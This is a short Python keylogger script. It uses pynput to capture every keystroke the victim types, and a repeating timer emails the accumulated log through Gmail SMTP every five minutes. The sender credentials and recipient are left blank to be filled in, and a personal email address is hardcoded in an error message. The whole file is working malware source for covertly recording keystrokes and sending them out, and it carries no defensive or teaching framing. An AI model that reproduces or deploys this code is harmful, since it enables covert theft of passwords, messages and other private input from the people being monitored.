from pynput import keyboard     #tracks the keys pressed         pip install pynput
import threading                #for multi tasking               pip install smtplib
import smtplib                  #for sending emails              pip install smtplib


log = ""
caps = False
count = 0
def grab_keys(key):# takes the input of keys and stores in a variable named log
    global log,caps,count
    try:
        if caps == True:     
            log = log+str(key.char).swapcase()
        else:
            log = log+str(key.char)
    except Exception:
        if str(key) == "Key.space":
            log+= " "
        elif str(key) == "Key.shift":
            pass
        elif str(key) == "Key.backspace":
            log = log [:-1]
        elif str(key) == "Key.caps_lock":
            caps = True
            count += 1
            if count > 1:
                count = 0
                caps = False
        elif str(key) == "Key.enter":
            log += "\n"
        else:
            log += " " + str(key) + " "
    print(log)

def send_email():      
    try:
        s = smtplib.SMTP("smtp.gmail.com", 587)
        s.starttls()
        sender_email = ""   # enter email of sender
        sender_password = ""  # enter app password of sender email. use this link to create app password: https://youtu.be/T0Op3Qzz6Ms?si=CXPtpRVapH-hr7so  
        s.login(sender_email, sender_password)
        msg = f"Subject: {"KeysLogged"}\n\n{log}"
        reciever_email = ""  # enter email of reciever
        s.sendmail(sender_email, reciever_email, msg) 
        s.quit()
        return "successfull"
    except Exception as e:
        print(f"Error sending email to malikhaziq93@gmail.com: {e}")
        return "failed"

def keys_logged():      # it will gather the whole keys pressed in a particular time
    global log
    send_email()
    log = ""
    time_interval = 300     #set the time in seconds for sending emails automatically
    timer = threading.Timer(300,keys_logged)
    timer.start()

listen = keyboard.Listener(on_press = grab_keys)
with listen:
    keys_logged()
    listen.join()






